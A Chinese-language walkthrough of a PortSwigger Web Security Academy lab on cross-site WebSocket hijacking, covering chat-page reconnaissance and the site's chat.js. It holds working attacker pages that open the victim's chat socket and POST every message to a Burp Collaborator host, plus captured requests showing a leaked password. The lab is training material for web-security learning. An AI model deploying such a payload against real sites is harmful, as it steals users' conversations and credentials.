# 实验室：跨站点 WebSocket 劫持

本在线商店有一个使用 WebSocket 实现的实时聊天功能。

要解决本实验室，请使用漏洞利用服务器托管一个 HTML/JavaScript 负载，通过[跨站点 WebSocket 劫持攻击](/web-security/websockets/cross-site-websocket-hijacking)窃取受害者的聊天记录，然后利用这些信息登录其账户。

> **注意**
> 为防止学院平台被用于攻击第三方，我们的防火墙会阻止实验室与任意外部系统之间的交互。要解决本实验室，你必须使用提供的漏洞利用服务器和/或 Burp Collaborator 的默认公共服务器。

## 步骤

侦察，使用 chat 功能
- 请求
    ```http
    GET /chat HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```html
        <h1>
            Live chat
        </h1>
        <table id="chat-area" class="is-table-information">
        </table>
        <form id="chatForm" action="wss://id.web-security-academy.net/chat">
            <p>
                Your message:
            </p>
            <textarea id="message-box" name="message" maxlength=500>
        </textarea>
            <button class="button" type="submit">
                Send
            </button>
        </form>
        <script src="/resources/js/chat.js">
        </script>
        ```

- 查看 JS 文件
    ```http
    GET /resources/js/chat.js HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应
        ```js
        (function() {
            var chatForm = document.getElementById("chatForm");
            var messageBox = document.getElementById("message-box");
            var webSocket = openWebSocket();

            messageBox.addEventListener("keydown", function(e) {
                if (e.key === "Enter" && !e.shiftKey) {
                    e.preventDefault();
                    sendMessage(new FormData(chatForm));
                    chatForm.reset();
                }
            });

            chatForm.addEventListener("submit", function(e) {
                e.preventDefault();
                sendMessage(new FormData(this));
                this.reset();
            });

            function writeMessage(className, user, content) {
                var row = document.createElement("tr");
                row.className = className

                var userCell = document.createElement("th");
                var contentCell = document.createElement("td");
                userCell.innerHTML = user;
                contentCell.innerHTML = (typeof window.renderChatMessage === "function") ? window.renderChatMessage(content) : content;

                row.appendChild(userCell);
                row.appendChild(contentCell);
                document.getElementById("chat-area").appendChild(row);
            }

            function sendMessage(data) {
                var object = {};
                data.forEach(function(value, key) {
                    object[key] = htmlEncode(value);
                });

                openWebSocket().then(ws => ws.send(JSON.stringify(object)));
            }

            function htmlEncode(str) {
                if (chatForm.getAttribute("encode")) {
                    return String(str).replace(/['"<>&\r\n\\]/gi, function(c) {
                        var lookup = {
                            '\\': '&#x5c;',
                            '\r': '&#x0d;',
                            '\n': '&#x0a;',
                            '"': '&quot;',
                            '<': '&lt;',
                            '>': '&gt;',
                            "'": '&#39;',
                            '&': '&amp;'
                        };
                        return lookup[c];
                    });
                }
                return str;
            }

            function openWebSocket() {
                return new Promise(res => {
                    if (webSocket) {
                        res(webSocket);
                        return;
                    }

                    let newWebSocket = new WebSocket(chatForm.getAttribute("action"));

                    newWebSocket.onopen = function(evt) {
                        writeMessage("system", "System:", "No chat history on record");
                        newWebSocket.send("READY");
                        res(newWebSocket);
                    }

                    newWebSocket.onmessage = function(evt) {
                        var message = evt.data;

                        if (message === "TYPING") {
                            writeMessage("typing", "", "[typing...]")
                        } else {
                            var messageJson = JSON.parse(message);
                            if (messageJson && messageJson['user'] !== "CONNECTED") {
                                Array.from(document.getElementsByClassName("system")).forEach(function(element) {
                                    element.parentNode.removeChild(element);
                                });
                            }
                            Array.from(document.getElementsByClassName("typing")).forEach(function(element) {
                                element.parentNode.removeChild(element);
                            });

                            if (messageJson['user'] && messageJson['content']) {
                                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
                            } else if (messageJson['error']) {
                                writeMessage('message', "Error:", messageJson['error']);
                            }
                        }
                    };

                    newWebSocket.onclose = function(evt) {
                        webSocket = undefined;
                        writeMessage("message", "System:", "--- Disconnected ---");
                    };
                });
            }
        })();
        ```

构造 ws 信息读取攻击
- 修改应用程序 JS 代码，构建攻击者页面
    ```html
    <script>
        var webSocket = openWebSocket();

        function writeMessage(messageJson) {

            fetch("https://id.oastify.com/ws", {
                method: "POST",
                mode: 'no-cors', 
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(messageJson)
            });
        }

        function openWebSocket() {
            return new Promise(res => {
                if (webSocket) {
                    res(webSocket);
                    return;
                }

                console.log("new ws");

                let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");

                newWebSocket.onopen = function(evt) {
                    newWebSocket.send("READY");
                    res(newWebSocket);

                    console.log("ws READY");
                }

                newWebSocket.onmessage = function(evt) {
                    var message = evt.data;

                    if (message !== "TYPING") {
                        var messageJson = JSON.parse(message);

                        if (messageJson['user'] && messageJson['content']) {
                            writeMessage(messageJson)
                        }
                    }
                };

                newWebSocket.onclose = function(evt) {
                    webSocket = undefined;
                };
            });
        }
    </script>
    ```

- 在浏览器测试
    - 发送到服务器
        ```log
        READY
        ```
    - 发送到客户端
        ```json
        {"user":"You","content":"test"}
        ```
    - 成功建立 ws 连接并读取数据

    - 查看协作服务器 HTTP 信息
        ```http
        POST /ws HTTP/1.1
        Host: id.oastify.com
        Content-Length: 31
        Sec-Ch-Ua-Platform: "Windows"
        Accept-Language: zh-CN,zh;q=0.9
        Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
        Content-Type: text/plain;charset=UTF-8
        Sec-Ch-Ua-Mobile: ?0
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
        Accept: */*
        Origin: https://exploit-id.exploit-server.net
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: empty
        Referer: https://exploit-id.exploit-server.net/
        Accept-Encoding: gzip, deflate, br
        Priority: u=1, i
        Connection: keep-alive

        {"user":"You","content":"test"}
        ```
        - JS 代码成功发送 ws 信息到协作服务器

- 发送载荷到受害者
    ```http
    POST /ws HTTP/1.1
    Host: id.oastify.com
    Connection: keep-alive
    Content-Length: 82
    sec-ch-ua-platform: "Linux"
    User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
    sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"
    Content-Type: text/plain;charset=UTF-8
    sec-ch-ua-mobile: ?0
    Accept: */*
    Origin: https://exploit-id.exploit-server.net
    Sec-Fetch-Site: cross-site
    Sec-Fetch-Mode: no-cors
    Sec-Fetch-Dest: empty
    Referer: https://exploit-id.exploit-server.net/
    Accept-Encoding: gzip, deflate, br, zstd
    Accept-Language: en-US,en;q=0.9

    {"user":"Hal Pline","content":"No problem carlos, it&apos;s xynh2gq02jtoyl20la65"}
    ```
    - 得到受害者聊天记录中关于账户密码的对话


- 精简后的攻击者页面
    ```html
    <script>
 
        let newWebSocket = new WebSocket("wss://id.web-security-academy.net/chat");
        console.log("new ws");

        newWebSocket.onopen = function(evt) {
            newWebSocket.send("READY");
            console.log("ws READY");
        }

        newWebSocket.onmessage = function(evt) {
            var message = evt.data;
            console.log(message);

            fetch("https://id.oastify.com/ws", {
                method: "POST",
                mode: 'no-cors', 
                body: message
            });
        };

    </script>
    ```
    - 仅保留核心步骤
        - 新建 ws 对象
        - 连接建立后发送初始字符串 `READY`
        - 收到消息后发送 JSON 到协作服务器
    - 每步添加控制台 log 用来 debug